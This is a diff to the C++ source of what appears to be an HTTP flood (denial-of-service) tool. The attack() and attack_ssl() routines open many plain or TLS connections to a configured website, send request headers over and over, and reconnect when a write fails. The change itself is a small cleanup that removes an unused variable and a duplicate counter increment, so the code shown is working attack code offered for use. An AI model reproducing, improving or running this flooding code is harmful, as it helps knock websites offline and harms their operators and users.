@@ -116,7 +116,6 @@ int Http_Flood::write_socket(SSL *ssl, const char *string, int length) {
 }
 
 void Http_Flood::attack() {
-    int r;
     std::vector<int> sockets;
     sockets.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
     for (int x = 0; x < conf->CONNECTIONS; x++) {
@@ -129,14 +128,13 @@ void Http_Flood::attack() {
             }
             httphdr header{};
             init_header(&header);
-            if((r = write_socket(sockets[x], header.get().c_str(), static_cast<int>(header.length()))) == -1){
+            if((write_socket(sockets[x], header.get().c_str(), static_cast<int>(header.length()))) == -1){
                 cleanup(&sockets[x]);
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), conf->protocol);
             }else{
                 if(conf->GetResponse){
                     read_socket(sockets[x]);
                 }
-                conf->voly++;
             }
         }
         conf->voly++;
@@ -145,7 +143,6 @@ void Http_Flood::attack() {
 }
 
 void Http_Flood::attack_ssl() {
-    int r;
     std::vector<int> sockets;
     std::vector<SSL_CTX *> CTXs;
     std::vector<SSL *> SSLs;
@@ -166,7 +163,7 @@ void Http_Flood::attack_ssl() {
             }
             httphdr header{};
             init_header(&header);
-            if((r = write_socket(SSLs[x], header.get().c_str(), static_cast<int>(header.length()))) == -1){
+            if((write_socket(SSLs[x], header.get().c_str(), static_cast<int>(header.length()))) == -1){
                 cleanup(SSLs[x], &sockets[x], CTXs[x]);
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), conf->protocol);
                 CTXs[x] = InitCTX();
@@ -175,7 +172,6 @@ void Http_Flood::attack_ssl() {
                 if(conf->GetResponse){
                     read_socket(SSLs[x]);
                 }
-                conf->voly++;
             }
         }
         conf->voly++;
